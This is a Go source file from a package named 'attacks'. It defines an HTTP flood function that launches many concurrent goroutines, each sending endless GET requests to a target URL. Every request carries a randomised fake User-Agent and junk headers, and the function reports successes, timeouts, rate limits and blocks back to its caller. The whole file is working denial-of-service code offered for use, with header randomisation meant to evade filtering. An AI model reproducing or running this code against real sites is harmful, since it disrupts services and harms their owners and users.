package attacks

import (
	"fmt"
	"net/http"
	"time"

	"github.com/brianvoe/gofakeit/v6"
)

func HttpFlood(url string, t int64, g, w int) (channel chan string) {
	hc := http.Client{Timeout: time.Duration(t) * time.Second}

	channel = make(chan string)

	for i := 0; i < g; i++ {
		go func() {
			for {
				// Time between requests
				time.Sleep(time.Duration(w) * time.Millisecond)

				req, err := http.NewRequest("GET", url, nil)

				if err != nil {
					continue
				}

				req.Header.Set("User-Agent", gofakeit.UserAgent())
				for i := 0; i < 5; i++ {
					req.Header.Set(gofakeit.Word(), gofakeit.Word())
				}

				res, err := hc.Do(req)

				channel <- "request"

				if err != nil {
					channel <- "timeout"
					continue
				}
				res.Body.Close()
				if res.StatusCode != 200 {
					channel <- fmt.Sprintf("lastErrorCode:%d", res.StatusCode)

					if res.StatusCode == http.StatusTooManyRequests {
						channel <- "rate limit"
						continue
					}

					if res.StatusCode == http.StatusForbidden {
						channel <- "forbidden"
						continue
					}

					channel <- "error"

					continue
				}

				channel <- "success"
			}
		}()
	}

	return
}
